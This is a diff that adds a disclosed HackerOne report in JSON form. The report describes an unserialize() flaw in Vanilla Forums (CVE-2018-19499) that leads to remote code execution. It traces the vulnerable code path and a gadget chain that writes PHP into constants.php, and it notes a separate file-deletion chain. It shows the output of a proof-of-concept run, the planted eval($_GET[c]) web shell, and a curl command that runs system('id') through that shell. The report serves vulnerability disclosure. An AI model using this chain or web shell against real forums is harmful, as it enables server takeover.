+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/041/443/1d895fb5ebd380a050d2d3e170729b5a72fb1379_medium.jpg?1472495053"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "vanilla", 
+            "first_to_agree": true, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 3527259, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-11-23T15:47:15.423Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-11-23T15:47:15.423Z", 
+            "actor": {
+                "url": "/vanilla", 
+                "profile": {
+                    "name": "Vanilla"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/017/443/305c2a7379725cdd5a45ac498670186a9d8d2c16_medium.png?1519846664"
+                }
+            }, 
+            "team_handle": "vanilla", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 3701314, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-11-26T17:39:45.809Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-11-26T17:39:45.809Z", 
+            "actor": {
+                "username": "mr_me", 
+                "url": "/mr_me", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/041/443/1d895fb5ebd380a050d2d3e170729b5a72fb1379_medium.jpg?1472495053"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "vanilla", 
+            "message": " CVE-2018-19499", 
+            "markdown_message": "<p>CVE-2018-19499</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3710706, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "singular_disclosure_allowed": true, 
+    "reporter": {
+        "username": "mr_me", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/mr_me", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/041/443/93e88f3b78320cbcd437c53af6b3646f5de99c84_small.jpg?1472495053"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 52, 
+        "name": "Deserialization of Untrusted Data"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "allow_singular_disclosure_after": -1146415.680791818, 
+    "disclosed_at": "2018-11-23T15:47:15.399Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/407552", 
+    "created_at": "2018-09-08T21:56:55.948Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<p><strong>Summary:</strong></p>\n\n<p>An authenticated admin user can trigger a call to unserialize() which can allow an attacker to gain remote code execution.</p>\n\n<p><strong>Description:</strong></p>\n\n<p>Please bare with me on this one, it&#39;s heavy. Ok, so after setting a Garden.TouchIcon setting (it can be several settings, this is just an example of one) we can reach an the code in renderMaster inside of the library/core/class.controller.php file.</p>\n<pre class=\"highlight plaintext\"><code>class Gdn_Controller extends Gdn_Pluggable {\n\n    ...\n\n    public function renderMaster() {\n        // Build the master view if necessary\n        if (in_array($this-&gt;_DeliveryType, [DELIVERY_TYPE_ALL])) {\n\n        ...\n\n            $touchIcon = c(&#39;Garden.TouchIcon&#39;);                                     // 1\n            if ($touchIcon) {\n                $this-&gt;Head-&gt;setTouchIcon(Gdn_Upload::url($touchIcon));\n            }\n</code></pre>\n<p>At [1] we see a call to the function c(). As it turns out, that function is just a macro for the call in library/core/functions.general.php</p>\n<pre class=\"highlight plaintext\"><code>if (!function_exists(&#39;config&#39;)) {\n    /**\n     * Retrieves a configuration setting.\n     *\n     * [@param](/param) string|bool $name The name of the configuration setting.\n     * Settings in different sections are separated by dots.\n     * [@param](/param) mixed $default The result to return if the configuration setting is not found.\n     * [@return](/return) mixed The configuration setting.\n     * [@see](/see) Gdn::config()\n     */\n    function config($name = false, $default = false) {                              // 2\n        return Gdn::config($name, $default);\n    }\n}\n</code></pre>\n<p>At [2] we see the call to Gdn::config which is using the &#39;Garden.TouchIcon&#39; setting. This function is defined in library/core/class.gdn.php.</p>\n<pre class=\"highlight plaintext\"><code>class Gdn {\n\n    ...\n\n    /**\n     * Get a configuration setting for the application.\n     *\n     * [@param](/param) string $name The name of the configuration setting. Settings in different sections are seperated by a dot (&#39;.&#39;)\n     * [@param](/param) mixed $default The result to return if the configuration setting is not found.\n     * [@return](/return) Gdn_Configuration|mixed The configuration setting.\n     */\n    public static function config($name = false, $default = false) {\n        if (self::$_Config === null) {\n            self::$_Config = static::getContainer()-&gt;get(self::AliasConfig);\n        }\n        $config = self::$_Config;\n        if ($name === false) {\n            $result = $config;\n        } else {\n            $result = $config-&gt;get($name, $default);        // 3\n        }\n\n        return $result;\n    }\n</code></pre>\n<p>At [3] the code calls get() on the Gdn_Configuration class using using the &#39;Garden.TouchIcon&#39;. This code is defined in library/core/class.configuration.php:</p>\n<pre class=\"highlight plaintext\"><code>class Gdn_Configuration extends Gdn_Pluggable {\n\n    ...\n\n    public function get($name, $defaultValue = false) {\n        // Shortcut, get the whole config\n        if ($name == &#39;.&#39;) {\n            return $this-&gt;Data;\n        }\n\n        $keys = explode(&#39;.&#39;, $name);\n        // If splitting is off, HANDLE IT\n        if (!$this-&gt;splitting) {\n//         $FirstKey = getValue(0, $Keys);\n            $firstKey = $keys[0];\n            if ($firstKey == $this-&gt;defaultGroup) {\n                $keys = [array_shift($keys), implode(&#39;.&#39;, $keys)];\n            } else {\n                $keys = [$name];\n            }\n        }\n        $keyCount = count($keys);\n\n        $value = $this-&gt;Data;\n        for ($i = 0; $i &lt; $keyCount; ++$i) {\n            if (is_array($value) &amp;&amp; array_key_exists($keys[$i], $value)) {\n                $value = $value[$keys[$i]];\n            } else {\n                return $defaultValue;\n            }\n        }\n\n        if (is_string($value)) {\n            $result = Gdn_Format::unserialize($value);                          // 4\n        } else {\n            $result = $value;\n        }\n\n        return $result;\n    }\n</code></pre>\n<p>At [4] we can see the static call to unserialize in the Gdn_Format and as suspected, inside of library/core/class.format.php we can see the following code:</p>\n<pre class=\"highlight plaintext\"><code>class Gdn_Format {\n\n    ...\n\n    /**\n     * Takes a serialized variable and unserializes it back into its original state.\n     * \n     * [@param](/param) string $serializedString A json or php serialized string to be unserialized.\n     * [@return](/return) mixed\n     */\n    public static function unserialize($serializedString) {\n        $result = $serializedString;\n\n        if (is_string($serializedString)) {\n            if (substr_compare(&#39;a:&#39;, $serializedString, 0, 2) === 0 || substr_compare(&#39;O:&#39;, $serializedString, 0, 2) === 0) {\n                $result = unserialize($serializedString);                          // 5\n            } elseif (substr_compare(&#39;obj:&#39;, $serializedString, 0, 4) === 0) {\n                $result = json_decode(substr($serializedString, 4), false);\n            } elseif (substr_compare(&#39;arr:&#39;, $serializedString, 0, 4) === 0) {\n                $result = json_decode(substr($serializedString, 4), true);\n            }\n        }\n        return $result;\n    }\n</code></pre>\n<p>At [5] we can reach the vulnerable unserialize with attacker controlled input</p>\n\n<h1 id=\"exploitation\">Exploitation:</h1>\n\n<p>Of course, theory is great but poc||gtfo? Well, as it turns out, there are a few options for us to pick from.</p>\n\n<p>saturn:vanilla mr_me$ grep --color=always -ir &quot;__destruct&quot; .<br>\n./library/database/class.dataset.php:    public function __destruct() {<br>\n./library/core/class.proxyrequest.php:    public function __destruct() {<br>\n./library/core/class.configuration.php:    public function __destruct() {</p>\n\n<p>The Gdn_DataSet class is useless to us, however the ProxyRequest class seems a little bit more interesting: </p>\n<pre class=\"highlight plaintext\"><code>class ProxyRequest {\n\n    ...\n\n    public function __destruct() {\n        if (file_exists($this-&gt;CookieJar)) {\n            unlink($this-&gt;CookieJar);\n        }\n    }\n</code></pre>\n<p>This can of course allow us to delete files from the remote system. Be careful here, as attackers can wipe the .htaccess files and weaken the security posture of the application. However, the prime candidate is RCE, so we opted for the next class, the Gdn_Configuration class of course! (how meta).</p>\n\n<p>Ok so life is born in Gdn_Configuration&#39;s __destruct:</p>\n<pre class=\"highlight plaintext\"><code>class Gdn_Configuration extends Gdn_Pluggable {\n\n    ...\n\n    /**\n     *\n     */\n    public function __destruct() {\n        if ($this-&gt;autoSave) {                      // 1\n            $this-&gt;shutdown();                      // 2\n        }\n    }\n\n    /**\n     *\n     */\n    public function shutdown() {\n        foreach ($this-&gt;sources as $source) {\n            $source-&gt;shutdown();                    // 3\n        }\n    }\n</code></pre>\n<p>We can reach the shutdown() call at [2] if we set the autoSave property at [1]. Then at [3] we can call shutdown again, but on a different class, presumably the Gdn_ConfigurationSource class.</p>\n<pre class=\"highlight plaintext\"><code>class Gdn_ConfigurationSource extends Gdn_Pluggable {\n\n    ...\n\n    /**\n     *\n     *\n     * [@throws](/throws) Exception\n     */\n    public function shutdown() {\n        if ($this-&gt;Dirty) {                 // 4\n            $this-&gt;save();                  // 5\n        }\n    }\n</code></pre>\n<p>We can reach the save() call at [5] by setting the dirty property at [4].</p>\n<pre class=\"highlight plaintext\"><code>class Gdn_ConfigurationSource extends Gdn_Pluggable {\n\n    ...\n\n    /**\n     *\n     * \n     * [@return](/return) bool|null\n     * [@throws](/throws) Exception\n     */\n    public function save() {\n        if (!$this-&gt;Dirty) {\n            return null;\n        }\n\n        $this-&gt;EventArguments[&#39;ConfigDirty&#39;] = &amp;$this-&gt;Dirty;\n        $this-&gt;EventArguments[&#39;ConfigNoSave&#39;] = false;\n        $this-&gt;EventArguments[&#39;ConfigType&#39;] = $this-&gt;Type;\n        $this-&gt;EventArguments[&#39;ConfigSource&#39;] = $this-&gt;Source;\n        $this-&gt;EventArguments[&#39;ConfigData&#39;] = $this-&gt;Settings;\n        $this-&gt;fireEvent(&#39;BeforeSave&#39;);\n\n        if ($this-&gt;EventArguments[&#39;ConfigNoSave&#39;]) {\n            $this-&gt;Dirty = false;\n            return true;\n        }\n\n        // Check for and fire callback if one exists\n        if ($this-&gt;Callback &amp;&amp; is_callable($this-&gt;Callback)) {\n            $callbackOptions = [];\n            if (!is_array($this-&gt;CallbackOptions)) {\n                $this-&gt;CallbackOptions = [];\n            }\n\n            $callbackOptions = array_merge($callbackOptions, $this-&gt;CallbackOptions, [\n                &#39;ConfigDirty&#39; =&gt; $this-&gt;Dirty,\n                &#39;ConfigType&#39; =&gt; $this-&gt;Type,\n                &#39;ConfigSource&#39; =&gt; $this-&gt;Source,\n                &#39;ConfigData&#39; =&gt; $this-&gt;Settings,\n                &#39;SourceObject&#39; =&gt; $this\n            ]);\n\n            $configSaved = call_user_func($this-&gt;Callback, $callbackOptions);\n\n            if ($configSaved) {\n                $this-&gt;Dirty = false;\n                return true;\n            }\n        }\n\n        switch ($this-&gt;Type) {                              // 6\n            case &#39;file&#39;:\n                if (empty($this-&gt;Source)) {\n                    trigger_error(errorMessage(&#39;You must specify a file path to be saved.&#39;, &#39;Configuration&#39;, &#39;Save&#39;), E_USER_ERROR);\n                }\n\n                $checkWrite = $this-&gt;Source;\n                if (!file_exists($checkWrite)) {\n                    $checkWrite = dirname($checkWrite);\n                }\n\n                if (!is_writable($checkWrite)) {\n                    throw new Exception(sprintf(t(&quot;Unable to write to config file &#39;%s&#39; when saving.&quot;), $this-&gt;Source));\n                }\n\n                $group = $this-&gt;Group;                                                              // 7\n                $data = &amp;$this-&gt;Settings;\n                if ($this-&gt;Configuration) {\n                    ksort($data, $this-&gt;Configuration-&gt;getSortFlag());\n                }\n\n                // Check for the case when the configuration is the group.\n                if (is_array($data) &amp;&amp; count($data) == 1 &amp;&amp; array_key_exists($group, $data)) {\n                    $data = $data[$group];\n                }\n\n                // Do a sanity check on the config save.\n                if ($this-&gt;Source == Gdn::config()-&gt;defaultPath()) {\n                    // Log root config changes\n                    try {\n                        $logData = $this-&gt;Initial;\n                        $logData[&#39;_New&#39;] = $this-&gt;Settings;\n                        LogModel::insert(&#39;Edit&#39;, &#39;Configuration&#39;, $logData);\n                    } catch (Exception $ex) {\n                    }\n\n                    if (!isset($data[&#39;Database&#39;])) {\n                        if ($pm = Gdn::pluginManager()) {\n                            $pm-&gt;EventArguments[&#39;Data&#39;] = $data;\n                            $pm-&gt;EventArguments[&#39;Backtrace&#39;] = debug_backtrace();\n                            $pm-&gt;fireEvent(&#39;ConfigError&#39;);\n                        }\n                        return false;\n                    }\n                }\n\n                $options = [\n                    &#39;VariableName&#39; =&gt; $group,                                                   // 8\n                    &#39;WrapPHP&#39; =&gt; true,\n                    &#39;ByLine&#39; =&gt; true\n                ];\n\n                if ($this-&gt;Configuration) {\n                    $options = array_merge($options, $this-&gt;Configuration-&gt;getFormatOptions());             // 9\n                }\n\n                // Write config data to string format, ready for saving\n                $fileContents = Gdn_Configuration::format($data, $options);                                 // 10\n\n                if ($fileContents === false) {\n                    trigger_error(errorMessage(&#39;Failed to define configuration file contents.&#39;, &#39;Configuration&#39;, &#39;Save&#39;), E_USER_ERROR);\n                }\n\n                // Save to cache if we&#39;re into that sort of thing\n                $fileKey = sprintf(Gdn_Configuration::CONFIG_FILE_CACHE_KEY, $this-&gt;Source);\n                if ($this-&gt;Configuration &amp;&amp; $this-&gt;Configuration-&gt;caching() &amp;&amp; Gdn::cache()-&gt;type() == Gdn_Cache::CACHE_TYPE_MEMORY &amp;&amp; Gdn::cache()-&gt;activeEnabled()) {\n                    $cachedConfigData = Gdn::cache()-&gt;store($fileKey, $data, [\n                        Gdn_Cache::FEATURE_NOPREFIX =&gt; true,\n                        Gdn_Cache::FEATURE_EXPIRY =&gt; 3600\n                    ]);\n                }\n\n                $tmpFile = tempnam(PATH_CONF, &#39;config&#39;);\n                $result = false;\n                if (file_put_contents($tmpFile, $fileContents) !== false) {                                 // 11\n                    chmod($tmpFile, 0775);\n                    $result = rename($tmpFile, $this-&gt;Source);                                              // 12\n                }\n</code></pre>\n<p>Ok so at [6] we trigger a switch statement and want to land into the &#39;file&#39; block. Then at [7] we want to set <code>$group</code> from <code>$this-&gt;Group</code> to some PHP code. This will become apparent soon.</p>\n\n<p>Then at [8] we set <code>$options</code> to be an associative array containing our controlled <code>$group</code> at &#39;VariableName&#39;. At [9] that array is merged with another array and then at [10] a call to format() is made. This has been excluded from the analysis but essentially, we can set a global variable in there using our controlled &#39;VariableName&#39; value.</p>\n\n<p>Now after [10] we have our PHP code in <code>$fileContents</code> is then placed into a random file in the config directory at [11]. Finally, at [12] the random file is renamed to the attackers supplied filename using <code>$this-&gt;Source</code>.</p>\n\n<p>This can allow remote code execution. In the exploit, I choose to use &#39;constants.php&#39; as a target for a few reasons:</p>\n\n<ol>\n<li>We have a &quot;show stopper&quot; as its know, which is <code>if (!defined(&#39;APPLICATION&#39;)) exit();</code>. This wont allow us to execute PHP code directly\neven if we delete the .htaccess using the other potential pop chain.</li>\n</ol>\n\n<p>This contants.php file is included into the web root of the application, so we can execute the injected PHP code from the index page.</p>\n\n<ol>\n<li>The config folder is naturally writable due to the caching in the same directory and that the code contantantly (pun intended) updates the config.php file.</li>\n</ol>\n\n<p>Remember to snapshot or backup your installation before running this exploit. It DOES NOT attempt to clean up after exploitation.</p>\n\n<h2 id=\"example\">Example:</h2>\n<pre class=\"highlight plaintext\"><code>saturn:~ mr_me$ ./poc.py \n(+) usage: poc.py &lt;target&gt; &lt;cookie&gt;\n(+) eg: poc.py 172.16.175.143 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1Mzg5NDk5OTIsImlhdCI6MTUzNjM1Nzk5Miwic3ViIjoyfQ.OoAIBcGiGKFPxGsfg_-9hFfohv0dO_CNqx1lK8YE7Kg\n\nsaturn:~ mr_me$ ./poc.py 172.16.175.143 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1Mzg5NDk5OTIsImlhdCI6MTUzNjM1Nzk5Miwic3ViIjoyfQ.OoAIBcGiGKFPxGsfg_-9hFfohv0dO_CNqx1lK8YE7Kg\n(+) targeting: http://172.16.175.143\n(+) shell injected into contants.php successfully!\n(+) shell at: http://172.16.175.143/?c=phpinfo();\n\nsaturn:~ mr_me$ curl -sSG &quot;http://172.16.175.143/?c=system(&#39;id&#39;);&quot; | cut -d &quot;&lt;&quot; -f1\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n</code></pre>\n<p>Now, on the target system:</p>\n<pre class=\"highlight plaintext\"><code>steven@pluto:/var/www/html/conf$ cat constants.php \n&lt;?php if (!defined(&#39;APPLICATION&#39;)) exit();\n$a=eval($_GET[c]);//[&#39;&#39;] = &#39;&#39;;\n\n// Last edited by admin (172.16.175.1)2018-09-08 20:35:19\n</code></pre>\n<h2 id=\"steps-to-reproduce\">Steps to reproduce:</h2>\n\n<ol>\n<li>Backup your installation.</li>\n<li>Login as an admin and get the Vanilla cookie</li>\n<li>Run the poc against your target with the cookie.</li>\n</ol>\n\n<h2 id=\"anything-else-we-should-know\">Anything else we should know?</h2>\n\n<p>Give me a few days and I&#39;ll write you a patch. Basically you just need a <code>__wakeUp</code> call in the Gdn_Configuration class.</p>\n\n<h2 id=\"impact\">Impact</h2>\n\n<p>High, RCE.</p>\n", 
+    "severity_rating": "critical", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "http://vanillaforums.com", 
+            "about": "Vanilla is a powerfully simple discussion forum you can easily customize to make as unique as your community.", 
+            "twitter_handle": "vanilla", 
+            "name": "Vanilla"
+        }, 
+        "handle": "vanilla", 
+        "url": "https://hackerone.com/vanilla", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/017/443/5df0d2dcfad30933e8b17f914d8906b5665abac8_small.png?1519846664", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/017/443/305c2a7379725cdd5a45ac498670186a9d8d2c16_medium.png?1519846664"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 17443, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
